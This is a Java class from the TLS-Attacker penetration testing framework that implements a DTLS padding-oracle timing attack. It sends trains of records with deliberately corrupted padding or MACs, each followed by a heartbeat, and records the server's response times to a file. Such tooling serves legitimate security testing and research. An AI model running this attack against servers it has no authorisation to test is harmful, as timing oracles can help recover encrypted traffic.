/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackCommandConfig;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.constants.AlertDescription;
import de.rub.nds.tlsattacker.core.constants.AlertLevel;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ApplicationMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
import de.rub.nds.tlsattacker.core.protocol.parser.HeartbeatMessageParser;
import de.rub.nds.tlsattacker.core.protocol.preparator.AlertPreparator;
import de.rub.nds.tlsattacker.core.protocol.preparator.HeartbeatMessagePreparator;
import de.rub.nds.tlsattacker.core.record.AbstractRecord;
import de.rub.nds.tlsattacker.core.record.Record;
import de.rub.nds.tlsattacker.core.record.layer.RecordLayer;
import de.rub.nds.tlsattacker.core.workflow.TlsConfig;
import de.rub.nds.tlsattacker.core.workflow.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.action.TLSAction;
import de.rub.nds.tlsattacker.core.workflow.action.executor.ExecutorType;
import de.rub.nds.tlsattacker.transport.UDPTransportHandler;
import de.rub.nds.modifiablevariable.util.RandomHelper;
import de.rub.nds.tlsattacker.core.workflow.chooser.DefaultChooser;
import java.io.FileWriter;
import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.locks.LockSupport;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Tests if the subject can be used as a padding oracle by sending messages with
 * invalid MACs or invalid paddings.
 *
 * @author Florian Pfützenreuter <florian.pfuetzenreuter@rub.de>
 */
public class DtlsPaddingOracleAttacker extends Attacker<DtlsPaddingOracleAttackCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(DtlsPaddingOracleAttacker.class);

    private TlsContext tlsContext;

    private RecordLayer recordLayer;
    private List<TLSAction> actionList;
    private UDPTransportHandler transportHandler;

    private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
            modifiedMacArray = new ModifiableByteArray();

    private WorkflowExecutor workflowExecutor;

    private WorkflowTrace trace;
    private final TlsConfig tlsConfig;

    public DtlsPaddingOracleAttacker(DtlsPaddingOracleAttackCommandConfig config) {
        super(config, false);
        tlsConfig = config.createConfig();
        tlsConfig.setExecutorType(ExecutorType.DTLS);
    }

    @Override
    public void executeAttack() {
        initExecuteAttack();

        long[][] resultBuffer = new long[config.getNrOfRounds()][2];
        FileWriter fileWriter;
        StringBuilder sb;
        int counter = 0;

        workflowExecutor.executeWorkflow();

        try {
            sb = new StringBuilder(50);
            for (int i = 0; i < config.getNrOfRounds(); i++) {
                resultBuffer[i] = executeAttackRound();

                if (resultBuffer[i][0] == -1 || resultBuffer[i][1] == -1) {
                    sb.append("Round no. ");
                    sb.append(i + 1);
                    sb.append(" - No useful results were gained. Repeat.");
                    i--;
                } else {
                    sb.append(i + 1);
                    sb.append(" of ");
                    sb.append(config.getNrOfRounds());
                    sb.append(" rounds.\n");
                }
                LOGGER.info(sb.toString());
                sb.setLength(0);
            }

            if (config.getResultFilePath() != null) {
                sb = new StringBuilder(2097152);
                fileWriter = new FileWriter(config.getResultFilePath(), true);

                for (long[] roundResults : resultBuffer) {
                    sb.append(counter);
                    sb.append(";invalid_Padding;");
                    sb.append(roundResults[0]);
                    sb.append("\n");
                    counter++;
                    sb.append(counter);
                    sb.append(";invalid_MAC;");
                    sb.append(roundResults[1]);
                    sb.append("\n");
                    counter++;
                    // Limit string builder RAM usage to about 4 MiByte by
                    // writing out data
                    if (sb.length() > 2097000) {
                        fileWriter.write(sb.toString());
                        sb.setLength(0);
                    }
                }

                fileWriter.write(sb.toString());
                fileWriter.close();
            }
        } catch (IOException e) {
            LOGGER.info("Encountered IOException while Executing Attack");
            LOGGER.debug(e.getLocalizedMessage());
        }

        closeDtlsConnectionGracefully();

        transportHandler.closeConnection();
    }

    private long[] executeAttackRound() throws IOException {
        byte[] roundMessageData = new byte[config.getTrainMessageSize()];
        RandomHelper.getRandom().nextBytes(roundMessageData);
        HeartbeatMessage sentHbMessage = new HeartbeatMessage(tlsConfig);
        HeartbeatMessagePreparator preparator = new HeartbeatMessagePreparator(new DefaultChooser(tlsContext,
                tlsContext.getConfig()), sentHbMessage);
        preparator.prepare();
        byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData,
                sentHbMessage);
        byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData,
                sentHbMessage);
        long[] results = new long[2];

        results[0] = handleTrain(invalidPaddingTrain, sentHbMessage.getPayload().getValue(), "Invalid Padding");

        results[1] = handleTrain(invalidMacTrain, sentHbMessage.getPayload().getValue(), "Invalid MAC");

        return results;
    }

    private long handleTrain(byte[][] train, byte[] sentHeartbeatMessagePayload, String trainInfo) {
        try {
            byte[] serverAnswer;

            if (config.getMessageWaitNanos() > 0) {
                serverAnswer = handleTrainIOWithWaitNanos(train, config.getMessageWaitNanos());
            } else {
                serverAnswer = handleTrainIO(train);
            }

            if (serverAnswer != null && serverAnswer.length > 1) {
                HeartbeatMessage receivedHbMessage = new HeartbeatMessage(tlsConfig);
                List<AbstractRecord> parsedReceivedRecords = recordLayer.parseRecords(serverAnswer);
                if (parsedReceivedRecords.size() != 1) {
                    LOGGER.info("Unexpected number of records parsed from server. Train: {}", trainInfo);

                    flushTransportHandler();
                    return -1;
                } else {
                    HeartbeatMessageParser parser = new HeartbeatMessageParser(0, parsedReceivedRecords.get(0)
                            .getProtocolMessageBytes().getValue(), ProtocolVersion.DTLS12);
                    receivedHbMessage = parser.parse();
                    if (!Arrays.equals(receivedHbMessage.getPayload().getValue(), sentHeartbeatMessagePayload)) {
                        LOGGER.info("Heartbeat answer didn't contain the correct payload. Train: " + trainInfo);
                        flushTransportHandler();
                        return -1;
                    } else {
                        LOGGER.info("Correct heartbeat-payload received. Train: {}", trainInfo);
                    }
                }
            } else {
                LOGGER.info("No data from the server was received. Train: {}", trainInfo);
            }
            return transportHandler.getResponseTimeNanos();
        } catch (SocketTimeoutException e) {
            LOGGER.info("Received timeout when waiting for heartbeat answer. Train: {}", trainInfo);
        } catch (Exception e) {
            LOGGER.debug(e.getMessage());
        }
        return -1;
    }

    private byte[] handleTrainIO(byte[][] train) throws Exception {
        for (byte[] record : train) {
            transportHandler.sendData(record);
        }
        return transportHandler.fetchData();
    }

    private byte[] handleTrainIOWithWaitNanos(byte[][] train, long waitNanos) throws Exception {
        for (byte[] record : train) {
            LockSupport.parkNanos(waitNanos);
            transportHandler.sendData(record);
        }
        return transportHandler.fetchData();
    }

    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
        byte[][] train = new byte[n + 1][];
        List<AbstractRecord> records = new ArrayList<>();
        ApplicationMessage apMessage = new ApplicationMessage(tlsConfig);
        SendAction action = new SendAction(apMessage);
        actionList.add(action);
        Record record;
        apMessage.setData(messageData);

        for (int i = 0; i < n; i++) {
            record = new Record();
            record.setPadding(modifiedPaddingArray);
            records.add(record);
            train[i] = recordLayer.prepareRecords(messageData, ProtocolMessageType.APPLICATION_DATA, records);
            records.remove(0);
        }

        records.add(new Record());
        action.getConfiguredMessages().add(heartbeatMessage);
        train[n] = recordLayer.prepareRecords(heartbeatMessage.getCompleteResultingMessage().getValue(),
                ProtocolMessageType.HEARTBEAT, records);

        return train;
    }

    private byte[][] createInvalidMacMessageTrain(int n, byte[] applicationMessageContent,
            HeartbeatMessage heartbeatMessage) {
        byte[][] train = new byte[n + 1][];
        List<AbstractRecord> records = new ArrayList<>();
        ApplicationMessage apMessage = new ApplicationMessage(tlsConfig);
        SendAction action = new SendAction(apMessage);
        actionList.add(action);
        apMessage.setData(applicationMessageContent);

        Record record = new Record();
        record.setMac(modifiedMacArray);
        record.setPadding(modifiedPaddingArray);
        records.add(record);
        byte[] recordBytes = recordLayer.prepareRecords(applicationMessageContent,
                ProtocolMessageType.APPLICATION_DATA, records);

        for (int i = 0; i < n; i++) {
            train[i] = recordBytes;
        }

        records.remove(0);
        records.add(new Record());
        action.getConfiguredMessages().add(heartbeatMessage);
        train[n] = (recordLayer.prepareRecords(heartbeatMessage.getCompleteResultingMessage().getValue(),
                ProtocolMessageType.HEARTBEAT, records));

        return train;
    }

    private void closeDtlsConnectionGracefully() {
        AlertMessage closeNotify = new AlertMessage(tlsConfig);
        closeNotify.setConfig(AlertLevel.WARNING, AlertDescription.CLOSE_NOTIFY);
        List<AbstractRecord> records = new ArrayList<>();
        records.add(new Record());

        AlertPreparator preparator = new AlertPreparator(new DefaultChooser(new TlsContext(tlsConfig), tlsConfig),
                closeNotify);
        preparator.prepare();
        try {
            transportHandler.sendData(recordLayer.prepareRecords(closeNotify.getCompleteResultingMessage().getValue(),
                    ProtocolMessageType.ALERT, records));
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    private void initExecuteAttack() {
        tlsContext = new TlsContext(tlsConfig);
        workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(), tlsContext);
        recordLayer = tlsContext.getRecordLayer();
        trace = tlsContext.getWorkflowTrace();
        actionList = trace.getTLSActions();
        modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
        modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
                0));
    }

    private void flushTransportHandler() throws IOException {
        transportHandler.setTlsTimeout(50);
        try {
            while (true) {
                transportHandler.fetchData();
            }
        } catch (SocketTimeoutException e) {
        } finally {
            transportHandler.setTlsTimeout(tlsConfig.getTlsTimeout());
        }
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not implemented yet");
    }
}
